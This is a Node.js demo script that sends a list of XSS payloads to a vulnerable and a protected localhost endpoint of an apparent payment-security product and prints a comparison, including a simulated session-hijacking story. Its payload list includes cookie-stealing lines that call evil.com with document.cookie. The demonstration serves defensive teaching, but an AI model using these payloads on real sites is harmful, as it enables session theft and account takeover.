const http = require('http');

const RESET = '\x1b[0m';
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const BOLD = '\x1b[1m';

const TARGETS = {
    vulnerable: new URL('http://localhost:5000/api/xss/vulnerable'),
    protected: new URL('http://localhost:5000/api/xss/protected'),
};

const PAYLOADS = [
    { payload: "<script>alert('XSS')</script>", type: 'stored' },
    { payload: '<img src=x onerror=alert(document.cookie)>', type: 'reflected' },
    { payload: 'javascript:void(document.cookie)', type: 'dom' },
    { payload: "<iframe src='javascript:alert(1)'></iframe>", type: 'stored' },
    { payload: "<svg onload=fetch('http://evil.com?c='+document.cookie)>", type: 'dom' },
    // Specific demo payload used in scenario: steals cookie via fetch to attacker domain
    { payload: "<script>fetch('http://evil.com?c='+document.cookie)</script>", type: 'stored' },
];

const SIMULATE = typeof process.env.PAYGUARD_SIMULATE !== 'undefined' ? process.env.PAYGUARD_SIMULATE !== 'false' : null;
const SIMULATED_STOLEN_COOKIE = process.env.SIMULATED_STOLEN_COOKIE || 'session=eyJhbGc...';

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function requestJson(url, body) {
    const payload = JSON.stringify(body);
    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': '10.0.0.66',
            'Content-Length': Buffer.byteLength(payload),
        },
    };

    const client = url.protocol === 'https:' ? require('https') : http;

    return new Promise((resolve, reject) => {
        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    resolve({ statusCode: res.statusCode, body: JSON.parse(data) });
                } catch {
                    resolve({ statusCode: res.statusCode, body: data });
                }
            });
        });

        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

function renderComparisonRow(label, vulnerableResponse, protectedResponse) {
    const vulnerableFlag = vulnerableResponse.body?.detected === true || vulnerableResponse.body?.safe === false;
    const protectedFlag = protectedResponse.body?.blocked === true || protectedResponse.body?.sanitizationApplied === true;

    const vulnerableText = vulnerableResponse.statusCode === 200
        ? `${RED}${vulnerableFlag ? 'VULNERABLE' : 'SAFE'}${RESET}`
        : `${RED}${vulnerableResponse.statusCode}${RESET}`;
    const protectedText = protectedResponse.statusCode === 200
        ? `${GREEN}${protectedFlag ? 'PROTECTED' : 'SANITIZED'}${RESET}`
        : `${RED}${protectedResponse.statusCode}${RESET}`;

    console.log(`${CYAN}${label.padEnd(36)}${RESET} ${vulnerableText.padEnd(24)} ${protectedText}`);

    if (vulnerableResponse.body) {
        console.log(`  vulnerable -> detected=${String(vulnerableResponse.body.detected)} safe=${String(vulnerableResponse.body.safe)}`);
    }
    if (protectedResponse.body) {
        console.log(`  protected  -> blocked=${String(protectedResponse.body.blocked)} sanitized=${String(protectedResponse.body.sanitizationApplied)}`);
    }
}

async function main() {
    // auto-detect remote security mode if PAYGUARD_SIMULATE not explicitly set
    async function fetchSecurityEnabled() {
        try {
            const client = TARGETS.vulnerable.protocol === 'https:' ? require('https') : require('http');
            const options = {
                protocol: TARGETS.vulnerable.protocol,
                hostname: TARGETS.vulnerable.hostname,
                port: TARGETS.vulnerable.port,
                path: '/api/payguard/status',
                method: 'GET',
                headers: { 'Content-Type': 'application/json' },
            };

            return await new Promise((resolve) => {
                const req = client.request(options, (res) => {
                    let data = '';
                    res.on('data', (chunk) => { data += chunk; });
                    res.on('end', () => {
                        try {
                            const parsed = data ? JSON.parse(data) : {};
                            resolve(parsed.securityEnabled === true);
                        } catch (e) {
                            resolve(null);
                        }
                    });
                });
                req.on('error', () => resolve(null));
                req.end();
            });
        } catch (e) {
            return null;
        }
    }

    let simulateMode = SIMULATE;
    if (simulateMode === null) {
        const remote = await fetchSecurityEnabled();
        // simulate when remote security is enabled; when unprotected perform real actions
        simulateMode = remote === true;
    }
    console.log(`${BOLD}${YELLOW}XSS ATTACK DEMO${RESET}`);
    console.log(`${CYAN}${'Payload'.padEnd(36)}${RESET} ${CYAN}${'Vulnerable'.padEnd(24)}${RESET} ${CYAN}Protected${RESET}`);
    console.log(`${'-'.repeat(36)} ${'-'.repeat(24)} ${'-'.repeat(24)}`);

    for (let i = 0; i < PAYLOADS.length; i += 1) {
        const payload = PAYLOADS[i];

        const requestBody = { input: payload.payload, type: payload.type };
        const vulnerableResponse = await requestJson(TARGETS.vulnerable, requestBody);
        const protectedResponse = await requestJson(TARGETS.protected, requestBody);

        renderComparisonRow(`Payload ${i + 1}`, vulnerableResponse, protectedResponse);

        // If simulation mode and payload looks like the demo steal payload, simulate stored XSS flow
        if (simulateMode && payload.payload.includes("evil.com")) {
            console.log(`${YELLOW}[XSS] Injecting payload vào trường "Nội dung chuyển khoản":${RESET}`);
            console.log(`${YELLOW}[XSS] Payload: ${payload.payload}${RESET}`);
            console.log(`${GREEN}[XSS] Stored in database ✓${RESET}`);
            await wait(800);
            console.log(`${YELLOW}[XSS] Victim opens transaction history...${RESET}`);
            await wait(500);
            console.log(`${RED}[XSS] Script executes! Cookie sent to attacker:${RESET}`);
            console.log(`${CYAN}[XSS] ${SIMULATED_STOLEN_COOKIE} (JWT token bị đánh cắp!)${RESET}`);
            console.log(`${YELLOW}[SUMMARY] Session hijacking thành công | Tài khoản bị chiếm${RESET}`);
            break;
        }

        if (i < PAYLOADS.length - 1) {
            await wait(500);
        }
    }

    console.log(`${YELLOW}VULNERABLE endpoint reflects unescaped input; PROTECTED endpoint sanitizes and blocks.${RESET}`);
}

main().catch((error) => {
    console.error(`${RED}[FATAL] ${error.message}${RESET}`);
    process.exit(1);
});